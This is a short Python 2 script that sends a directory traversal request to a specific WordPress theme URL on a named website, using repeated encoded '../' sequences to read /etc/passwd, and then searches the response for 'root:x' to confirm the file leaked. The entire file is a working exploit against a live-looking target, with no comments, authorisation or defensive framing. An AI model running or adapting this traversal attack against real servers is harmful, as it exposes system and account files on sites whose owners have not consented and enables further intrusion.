import requests
from lxml import html
from urlparse import urlparse
from urlparse import parse_qs
from urllib import urlencode, unquote

url = "http://www.tapenade.co.uk/wp-content/themes/tapenade/js/?ver=4.0&f=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"

r = requests.get(url)

def find_string(html_text, find_string):
    tree = html.fromstring(html_text)
    flag = False
    print 'find_string: ', find_string
    for e in tree.xpath('//text()'):
        if find_string in e:
            flag = True
    print "Flag value:", flag, "\n"
    return flag

if __name__ == '__main__':
    find_string(r.text, "root:x")
